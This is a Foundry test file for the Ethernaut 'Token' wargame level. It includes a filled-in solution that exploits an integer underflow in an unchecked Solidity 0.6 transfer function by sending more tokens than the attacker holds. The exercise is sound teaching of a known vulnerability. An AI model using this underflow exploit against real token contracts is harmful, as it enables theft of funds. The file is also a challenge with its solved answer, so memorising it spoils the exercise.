// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

// Token.sol is Solidity ^0.6, so we cannot import it into this ^0.8 test.
// Use an interface + deployCode to talk to the compiled Token bytecode.
interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract TokenTest is Test {
    IToken public target;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    // Ethernaut gives the player 20 tokens to start.
    uint256 constant PLAYER_START_BALANCE = 20;
    uint256 constant INITIAL_SUPPLY = 1000;

    function setUp() public {
        // Deploy Token(1000); deployer receives the full supply.
        vm.startPrank(deployer);
        target = IToken(deployCode("src/Token.sol:Token", abi.encode(INITIAL_SUPPLY)));
        // Give attacker the usual starting balance (like the Ethernaut instance).
        target.transfer(attacker, PLAYER_START_BALANCE);
        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition:
        //   attacker's balance becomes much larger than the starting 20
        //   (Ethernaut: get a balance greater than 20)
        //
        // Hints (look at Token.sol carefully):
        //   - Compiled with Solidity ^0.6.0 — NO built-in overflow/underflow checks
        //   - transfer does: require(balances[msg.sender] - _value >= 0);
        //   - Underflow: if you have 20 and transfer 21, (20 - 21) wraps to a huge uint256
        //   - That huge number still passes >= 0, then balances[msg.sender] underflows too
        //
        // Tip:
        //   target.transfer(someAddress, amountBiggerThanYourBalance);

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        target.transfer(makeAddr("dummy"), 21);
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertGt(
            target.balanceOf(attacker),
            PLAYER_START_BALANCE,
            "attacker should have more than the starting 20 tokens"
        );
    }
}
